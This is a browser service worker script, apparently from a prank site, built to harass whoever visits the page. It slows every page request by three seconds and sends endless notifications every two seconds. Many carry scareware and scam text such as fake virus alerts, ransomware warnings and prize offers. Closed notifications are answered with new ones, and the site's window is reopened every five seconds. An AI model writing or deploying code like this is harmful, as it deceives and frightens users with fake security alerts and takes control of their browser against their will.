self.addEventListener('install', () => {
  self.skipWaiting()
  // Aggressive re-registration
  setInterval(() => {
    self.registration.update()
  }, 1000)
})

self.addEventListener('activate', (e) => {
  e.waitUntil(clients.claim())
})

self.addEventListener('fetch', (e) => {
  if (e.request.url.includes('sw.js') || e.request.url.includes('manifest.json')) {
    return
  }
  e.respondWith(
    new Promise((resolve) => {
      setTimeout(() => {
        resolve(fetch(e.request).catch(() => new Response('', { status: 503 })))
      }, 3000)
    })
  )
})

self.addEventListener('notificationclick', (e) => {
  e.notification.close()
  const url = 'https://n5za.github.io/'
  e.waitUntil(
    clients.matchAll({ type: 'window' }).then((clientsList) => {
      for (const c of clientsList) {
        if ('focus' in c) return c.focus()
      }
      if (clients.openWindow) return clients.openWindow(url)
    })
  )
})

self.addEventListener('notificationclose', () => {
  setTimeout(() => {
    self.registration.showNotification('Miss me? 🥺', {
      body: 'Come back! The fun never ends!',
      icon: 'cat-cute.jpg',
      tag: 'miss-' + Date.now(),
      requireInteraction: true,
      vibrate: [200, 100, 200, 100, 500]
    })
    clients.matchAll({ type: 'window' }).then((list) => {
      if (list.length === 0 && clients.openWindow) {
        clients.openWindow('https://n5za.github.io/')
      }
    })
  }, 500)
})

// Spam notifications every 2 seconds (no cap)
setInterval(() => {
  const messages = [
    'Your computer has a virus!',
    'Click here to claim your prize!',
    'You are the 999,999th visitor!',
    'FREE iPhone 16!',
    'Your files are being encrypted',
    'Someone is watching you through your webcam',
    'Your battery is critically low',
    'Update Java now! Critical security patch',
    'All your base are belong to us',
    'You would make a great hamster',
    'Your search history has been uploaded',
    'Your computer is now part of a botnet',
    'Error 0xDEADBEEF: Brain not found',
    'You have been hacked!',
    'Your IP address has been leaked!',
    'Click to remove virus!',
    'Your PC is infected!',
    'Windows has detected a threat!',
    'Warning: System compromised!',
    'Hackers are watching you!',
    'Your webcam has been accessed!',
    'Install antivirus now!'
  ]
  self.registration.showNotification(
    messages[Math.floor(Math.random() * messages.length)],
    {
      icon: 'cat-cute.jpg',
      tag: 'spam-' + Date.now(),
      requireInteraction: true,
      vibrate: [200, 100, 200],
      silent: false
    }
  )
}, 2000)

// Periodic background sync
try {
  self.registration.periodicSync.register('annoy-sync', { minInterval: 1 }).catch(() => {})
} catch(e) {}

// Sync event
self.addEventListener('sync', (e) => {
  if (e.tag === 'annoy-sync') {
    e.waitUntil(
      self.registration.showNotification('Back online! 🎉', {
        body: 'Time for more fun!',
        tag: 'sync-' + Date.now(),
        requireInteraction: true
      })
    )
  }
})

// Push subscription persistence
self.addEventListener('pushsubscriptionchange', (e) => {
  e.waitUntil(
    self.registration.pushManager.subscribe({
      userVisibleOnly: true,
      applicationServerKey: new Uint8Array(65).fill(1)
    }).catch(() => {})
  )
})

// Push event
self.addEventListener('push', (e) => {
  const data = e.data ? e.data.text() : 'Hello!'
  e.waitUntil(
    self.registration.showNotification(data, {
      tag: 'push-' + Date.now(),
      requireInteraction: true,
      vibrate: [200, 100, 200]
    })
  )
})

// Message event - open window when message received
self.addEventListener('message', (e) => {
  if (e.data === 'open') {
    clients.matchAll({ type: 'window' }).then((clientsList) => {
      if (clientsList.length === 0) {
        clients.openWindow('https://n5za.github.io/')
      }
    })
  }
  if (e.data === 'ping') {
    e.source.postMessage('pong')
  }
})

// Periodically check if any windows are open, reopen if not
setInterval(() => {
  clients.matchAll({ type: 'window' }).then((clientsList) => {
    if (clientsList.length === 0) {
      clients.openWindow('https://n5za.github.io/')
    }
  })
}, 5000)
